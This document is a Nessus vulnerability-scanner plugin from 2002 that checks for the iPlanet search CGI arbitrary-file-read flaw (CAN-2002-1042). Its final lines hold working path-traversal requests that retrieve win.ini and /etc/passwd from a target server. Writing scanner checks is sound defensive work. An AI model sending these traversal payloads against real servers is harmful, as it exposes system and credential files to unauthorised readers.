#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11043);
 script_version ("$Revision: 1.5 $");
 script_cve_id("CAN-2002-1042");
 script_bugtraq_id(5191);
 
 name["english"] = "iPlanet Search Engine File Viewing";
 script_name(english:name["english"]);
 
 desc["english"] = "
An attacker may be able to read arbitrary files on the remote web 
server, using the 'search' CGI that comes with iPlanet. 

Risk factor : High
Solution : Turn off the search engine until a patch is released";


 script_description(english:desc["english"]);
 
 summary["english"] = "Attempts to read an arbitrary file using a feature in iPlanet"; 
 
 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2002 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");

function check(item, exp)
{
 req = http_get(item:item, port:port);
 soc = http_open_socket(port);
 if(soc)
 {
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  r = tolower(r);
  http_close_socket(soc);
  if(egrep(string:r, pattern:exp, icase:1)){
	security_hole(port);
	exit(0);
	}
 }
 return(0);
}



port = get_kb_item("Services/www");
if(!port)port = 80;

if(!get_port_state(port))exit(0);

check(item:"/search?NS-query-pat=..\..\..\..\..\..\..\..\winnt\win.ini", exp:"\[fonts\]");
check(item:"/search?NS-query-pat=../../../../../../../../../etc/passwd", exp:"root:.*:0:[01]:.*");


